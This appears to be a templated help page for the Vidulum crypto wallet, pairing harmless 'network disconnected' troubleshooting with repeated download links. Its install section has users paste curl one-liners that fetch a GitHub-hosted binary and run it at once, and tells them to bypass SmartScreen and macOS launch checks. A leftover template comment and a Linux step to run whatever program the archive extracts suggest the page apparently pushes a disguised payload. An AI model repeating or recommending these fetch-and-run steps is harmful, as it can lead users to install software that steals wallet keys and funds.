![Vidulum](../assets/banner-article.png)

# Vidulum Network Disconnected: Checking a Chain Before You Send

How to tell a chain problem from a local one, without guessing.

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

The [current Vidulum release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1) is the first thing to rule out when one chain misbehaves.

> One chain down is a chain problem. Every chain down at once is almost always local.

A disconnected message means the wallet cannot currently read that chain, not that your coins are gone. The useful question is whether the problem is on your side or the network's, and the fastest way to answer it is to compare a second chain in the same application. This page covers that test, what to try in order, and when waiting is the correct action.

<!-- ARTICLE-BODY-BEGIN -->

## What "disconnected" actually means

The wallet reads chain state through remote nodes rather than downloading the whole chain. When it says a network is disconnected, it means the read failed: the node did not answer, your connection did not reach it, or the chain itself is not producing blocks right now.

None of those conditions touch your keys or your balance. The coins are recorded on the chain; the wallet is a viewer. A viewer with no signal shows nothing, which is why the balance can look empty and the send can be blocked at the same time.

## The two-chain test

Open a second network and check whether it loads.

- **Second chain loads normally.** The problem is specific to the first chain: a node issue or a chain-level outage.
- **No chain loads.** The problem is local: your connection, a firewall, or the application itself.

This one comparison replaces most guesswork. It costs ten seconds and it tells you which half of the checklist applies.

## What to try, in order

1. Run the current release, since an older build can fail against a chain that changed.
2. Retry the chain after a short wait; a transient node failure often clears.
3. Check another chain to confirm the two-chain test.
4. Restart the application and try the chain again.
5. Check whether the chain is producing blocks at all, using an explorer for that network.
6. If only one chain is affected and the chain is healthy, wait: the wallet will reconnect when a node answers.

A per-chain status light is not something this page can promise, because the current interface documentation does not describe one. Judge by whether balances load, not by an indicator.

## When waiting is right

Chains have maintenance windows, upgrades and congestion. If the chain is not producing blocks, nothing you do locally will change that, and repeated retries only add noise. Sending is not possible while the chain is unreachable, and the correct action is to wait and retry later.

Your funds are not at risk during an outage. They are on the chain, and the send you cannot complete simply has not happened.

A send that already failed is covered in <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md">Vidulum Wallet send error checks</a>.

## Working offline

Holding, receiving and reviewing addresses does not require the chain to be reachable; the addresses stay the same. Only operations that need current state - sending, swapping, reading a balance - depend on the connection. If you are travelling or offline, keep the phrase safe and defer sends rather than fighting the connection.

A balance that will not load belongs in <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-balance-not-showing-received-coins.md">Vidulum balance not showing received coins</a>, which starts with the explorer test.

If the chain stays down, <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-support-email-channels.md">Vidulum Wallet support channels</a> explains what a useful report contains.

Run the <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a> build before reporting anything to support.

## FAQ

### Is my wallet compromised if it says disconnected?

No. Disconnected is a read failure, not a security event.

### Why does one chain fail while others work?

Because each chain is read separately. One unreachable node affects one chain.

### Do I need to reinstall?

Try the current release first. Reinstalling is the last step, not the first.

### Can I send while the chain is unreachable?

No. The transaction cannot be prepared against state the wallet cannot read.

<!-- ARTICLE-BODY-END -->

## How to install Vidulum

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip -o wallet.zip -d vidulum-linux`.
3. Make it executable and run it: `chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop`.
4. If the archive extracts a differently named program or a folder of its own, run that file instead: the ZIP is the download, not the program.
<!-- INSTALL-END -->

## Related guides

[Send error checks](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md) - [Balance not showing](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-balance-not-showing-received-coins.md) - [Support channels](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-support-email-channels.md) - [Current release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1)
